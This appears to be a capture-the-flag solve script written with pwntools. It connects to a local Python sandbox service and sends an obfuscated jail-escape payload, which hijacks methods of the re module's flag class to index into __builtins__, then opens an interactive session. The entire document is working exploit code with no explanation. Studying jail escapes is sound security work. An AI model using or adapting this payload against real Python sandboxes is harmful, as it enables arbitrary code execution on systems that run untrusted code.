from pwn import *

#p = process('./sandbox.py')
p = remote("localhost", 23945)
prompt = '[re.A^[re.A[[]]for re.RegexFlag.__getitem__ in[re.sub.__builtins__[[x for x in re.sub.__builtins__][re.L.value^re.S.value^re.M.value]]]][re.L.value^re.L.value]for re.RegexFlag.__xor__ in[re.sub.__builtins__[[x for x in re.sub.__builtins__][re.L.value^re.S.value]]]]'.replace(' ', '\t')
p.sendline(prompt)
p.interactive()
